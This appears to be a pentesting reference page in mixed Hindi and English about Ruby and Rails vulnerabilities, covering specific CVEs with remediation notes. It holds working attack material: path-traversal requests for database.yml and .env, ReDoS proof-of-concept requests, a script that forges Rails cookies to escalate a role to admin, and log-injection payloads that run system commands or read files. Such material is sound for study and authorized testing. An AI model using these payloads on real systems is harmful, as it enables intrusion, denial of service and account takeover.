# Ruby ट्रिक्स

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड से RCE

As explained in [this article](https://www.offsec.com/blog/cve-2024-46986/), `config/initializers/` जैसे संवेदनशील डायरेक्टरीज़ में `.rb` फ़ाइल अपलोड करने से Ruby on Rails applications में remote code execution (RCE) हो सकता है।

टिप्स:
- अन्य boot/eager-load लोकेशंस जो app start पर execute होते हैं भी writeable होने पर रिस्की होते हैं (उदा., `config/initializers/` क्लासिक उदाहरण है)। अगर आपको कोई arbitrary file upload मिलता है जो `config/` के किसी भी स्थान में land करता है और बाद में evaluated/required किया जाता है, तो आप boot पर RCE प्राप्त कर सकते हैं।
- ऐसे dev/staging बिल्ड खोजें जो user-controlled फाइलों को container image में कॉपी करते हैं जहाँ Rails उन्हें boot पर load करेगा।

## Active Storage image transformation → command execution (CVE-2025-24293)

जब कोई एप्लिकेशन Active Storage को `image_processing` + `mini_magick` के साथ उपयोग करता है, और image transformation methods को untrusted parameters पास करता है, तो Rails के 7.1.5.2 / 7.2.2.2 / 8.0.2.1 से पहले के संस्करण command injection की अनुमति दे सकते हैं क्योंकि कुछ transformation methods डिफ़ॉल्ट रूप से गलती से allow किए गए थे।

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- परीक्षण के दौरान क्या प्रयास करें
- किसी भी endpoints की पहचान करें जो variant/processing options, transformation names, या arbitrary ImageMagick arguments स्वीकार करते हों।
- `params[:t]` और `params[:v]` को शकास्पद त्रुटियों या execution side-effects के लिए fuzz करें। यदि आप method name को प्रभावित कर सकते हैं या raw arguments पहुँचाने में सक्षम हैं जो MiniMagick तक पहुँचते हैं, तो आप image processor host पर code exec प्राप्त कर सकते हैं।
- यदि आपके पास केवल generated variants की read-access है, तो crafted ImageMagick operations के जरिए blind exfiltration का प्रयास करें।

- रिमेडिएशन/डिटेक्शन
- यदि आप Active Storage + `image_processing` + `mini_magick` के साथ Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 देख रहे हैं और user-controlled transformations मौजूद हैं, तो इसे exploitable माना जाना चाहिए। उन्नयन की सिफारिश करें और methods/params के लिए कड़ी allowlists और एक hardened ImageMagick policy लागू करने की सलाह दें।

## Rack::Static LFI / path traversal (CVE-2025-27610)

यदि target stack Rack middleware को सीधे या frameworks के माध्यम से उपयोग करता है, तो `rack` के 2.2.13, 3.0.14, और 3.1.12 से पहले के संस्करण `:root` unset/misconfigured होने पर `Rack::Static` के जरिए Local File Inclusion की अनुमति देते हैं। `PATH_INFO` में encoded traversal प्रोसेस के working directory या किसी अनपेक्षित root के अंतर्गत फाइलें उजागर कर सकता है।

- उन ऐप्स की तलाश करें जो `config.ru` या middleware stacks में `Rack::Static` mount करते हैं। static paths के खिलाफ encoded traversals आज़माएँ, उदाहरण के लिए:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
prefix को configured `urls:` से मेल खाने के लिए समायोजित करें। यदि ऐप फ़ाइल सामग्री के साथ प्रतिक्रिया देता है, तो संभवतः आपके पास resolved `:root` के अंतर्गत किसी भी चीज़ के लिए LFI है।

- निवारण: Rack को अपग्रेड करें; सुनिश्चित करें कि `:root` केवल public फाइलों की एक डायरेक्टरी की ओर पॉइंट करे और स्पष्ट रूप से सेट हो।

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` और < `2.2.8.1` crafted `Content-Type: multipart/form-data` headers को पार्स करने में सुपर-लिनियर समय लेते थे। एक विशाल `A=` पैरामीटर सूची वाले एकल POST से एक Puma/Unicorn worker फंस सकता है और DoS या request queue starvation हो सकता है।

- Quick PoC (will hang one worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- यह किसी भी Rack-based stack (Rails/Sinatra/Hanami/Grape) के खिलाफ काम करता है। यदि fronted by nginx/haproxy with keep-alive हो, तो workers को खत्म करने के लिए parallel में दोहराएँ।
- पैच करके parser को linear बनाया गया था; `rack` gem version < `3.0.9.1` या < `2.2.8.1` ढूँढें। assessments में बताएं कि WAFs आमतौर पर इसे ब्लॉक नहीं करते क्योंकि header syntactically valid है।

## REXML XML parser ReDoS (CVE-2024-49761)

REXML gem < 3.3.9 (Ruby 3.1 और पहले वाले) hex numeric character references जिनमें लंबी digit runs हों (उदा., `&#1111111111111x41;`) को पार्स करते समय catastrophic backtracking करते हैं। REXML या इसे wrap करने वाली लाइब्रेरीज़ (SOAP/XML API clients, SAML, SVG uploads) द्वारा प्रोसेस किया गया कोई भी XML CPU exhaustion के लिए दुरुपयोग किया जा सकता है।

न्यूनतम ट्रिगर XML पार्स करने वाले Rails endpoint के खिलाफ:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
यदि प्रोसेस कुछ सेकंड के लिए व्यस्त रहता है और worker CPU स्पाइक्स दिखता है, तो यह सम्भवतः कमजोर है। हमला low bandwidth वाला है और उन बैकग्राउंड जॉब्स को भी प्रभावित करता है जो XML ingest करते हैं।

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Many Rack stacks में डिफ़ॉल्ट उपयोग होने वाला `cgi` gem single malicious header से एप्लिकेशन को freeze कर सकता है:
- `CGI::Cookie.parse` सुपर-लीनियर था; बड़े cookie strings (हजारों delimiters) O(N²) व्यवहार ट्रिगर करते थे।
- `CGI::Util#escapeElement` regex ने HTML escaping पर ReDoS की अनुमति दी।

दोनों मुद्दे `cgi` 0.3.5.1 / 0.3.7 / 0.4.2 में फिक्स कर दिए गए हैं। Pentests के लिए, एक विशाल `Cookie:` हेडर भेजें या untrusted HTML को helper code को फ़ीड करें और worker lockup देखें। प्रभाव बढ़ाने के लिए keep-alive के साथ combine करें।

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

`googlesign_in` gem < 1.3.0 (Google OAuth on Rails के लिए उपयोग) ने `proceedto` पैरामीटर पर incomplete same-origin चेक किया। एक malformed URL जैसे `proceedto=//attacker.com/%2F..` चेक को bypass कर देता है और user को off-site redirect करता है जबकि Rails flash/session cookies बरकरार रहती हैं।

Exploit flow:
1. Victim attacker द्वारा होस्ट किए गए तैयार किए गए Google Sign-In लिंक पर क्लिक करता है।
2. प्रमाणीकरण के बाद gem attacker-controlled domain पर redirect कर देता है, जिससे flash notices या wildcard domain में scope किए गए cookies में रखा कोई भी डेटा leak हो जाता है।
3. यदि ऐप flash में short-lived tokens या magic links स्टोर करता है, तो इसे account takeover में बदला जा सकता है।

टेस्टिंग के दौरान, Gemfile.lock में `googlesign_in` < 1.3.0 के लिए grep करें और malformed `proceedto` मान आज़माएँ। Location header और cookie reflection के जरिए पुष्टि करें।

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails `secret_key_base` से व्युत्पन्न कुंजियों का उपयोग करके cookies को encrypt और sign करता है। यदि वह value leak हो जाती है (उदा., repo, logs, या misconfigured credentials में), तो आमतौर पर आप cookies को decrypt, modify और re-encrypt कर सकते हैं। यदि ऐप cookies में roles, user IDs, या feature flags स्टोर करता है, तो यह अक्सर authz bypass में बदल जाता है।

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
नोट्स:
- पुराने ऐप्स AES-256-CBC और salts `encrypted cookie` / `signed encrypted cookie` या JSON/Marshal serializers का उपयोग कर सकते हैं। salts, cipher, और serializer को अनुसार समायोजित करें।
- समझौता/आकलन की स्थिति में, सभी मौजूदा cookies को अमान्य करने के लिए `secret_key_base` घुमाएँ।

## देखें (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

जब कोई ऐप (अक्सर एक साधारण Rack/Sinatra/Rails endpoint) एक साथ:
- उपयोगकर्ता-नियंत्रित स्ट्रिंग को यथावत् लॉग करता है, और
- बाद में उसी स्ट्रिंग से व्युत्पन्न path वाले फाइल को `load` करता है ( `Pathname#cleanpath` के बाद),

आप अक्सर लॉग को poison करके और फिर ऐप को लॉग फ़ाइल को `load` करने के लिए मजबूर करके remote code execution प्राप्त कर सकते हैं। प्रमुख primitives:

- Ruby `load` टार्गेट फ़ाइल की सामग्री को फ़ाइल एक्सटेंशन की परवाह किए बिना Ruby के रूप में evaluate करता है। कोई भी readable टेक्स्ट फ़ाइल जिसकी सामग्री Ruby के रूप में parse हो जाए, execute की जाएगी।
- `Pathname#cleanpath` फ़ाइल सिस्टम तक पहुँचाए बिना `.` और `..` segments को collapse कर देता है, जिससे path smuggling संभव होता है: attacker-controlled junk लॉगिंग के लिए आगे जोड़ा जा सकता है जबकि cleaned path फिर भी execute करने के लिए इच्छित फ़ाइल पर resolve होता है (उदा., `../logs/error.log`)।

### न्यूनतम कमजोर पैटर्न
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### क्यों लॉग में मान्य Ruby हो सकता है
`Logger` इस तरह के prefix lines लिखता है:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
In Ruby, `#` टिप्पणी शुरू करता है और `9/2/2025` सिर्फ गणितीय अभिव्यक्ति है। To inject valid Ruby code you need to:
- अपने payload को नई लाइन पर शुरू करें ताकि वह INFO line में `#` द्वारा टिप्पणी न हो जाए; एक leading newline भेजें (`\n` या `%0A`)।
- INFO line द्वारा छोड़ा गया dangling `[` बंद करें। एक सामान्य ट्रिक है `]` से शुरू करना और वैकल्पिक रूप से parser को संतुष्ट करने के लिए `][0]=1` डालना।
- फिर कोई भी Ruby रखें (उदा., `system(...)`)।

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### एक ही स्ट्रिंग को स्मगल करना जो दोनों कोड को लॉग करे और लॉग पथ पर रिज़ॉल्व हो
We want one attacker-controlled string that:
- when logged raw, contains our Ruby payload, and
- when passed through `Pathname.new(<input>).cleanpath`, resolves to `../logs/error.log` so the subsequent `load` executes the just-poisoned log file.

`Pathname#cleanpath` ignores schemes and collapses traversal components, so the following works:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- The `#` before `://` यह सुनिश्चित करता है कि जब log execute होगा तो Ruby tail को ignore कर दे, जबकि `cleanpath` अभी भी suffix को `../logs/error.log` तक घटा देता है।
- The leading newline INFO line से बाहर निकाल देता है; `]` dangling bracket को बंद करता है; `][0]=1` parser को संतुष्ट करता है।

### End-to-end exploitation
1. Send the following as the backup script name (URL-encode the first newline as `%0A` if needed):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. The app आपके raw string को `logs/error.log` में log करता है।
3. The app `cleanpath` को compute करता है जो `../logs/error.log` में resolve होता है और उस पर `load` को कॉल करता है।
4. Ruby लॉग में आपने जो code inject किया था उसे execute कर देता है।

To exfiltrate a file in a CTF-like environment:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (पहला कैरेक्टर एक नई पंक्ति है):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## संदर्भ

- [Rails सुरक्षा घोषणा: CVE-2025-24293 Active Storage असुरक्षित transformation methods (सुधारित संस्करण: 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub सुरक्षा सलाह: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath दस्तावेज़](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Ruby में load कैसे काम करता है](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS सुरक्षा सलाह (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [CGI / URI के लिए Ruby सुरक्षा सलाह (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
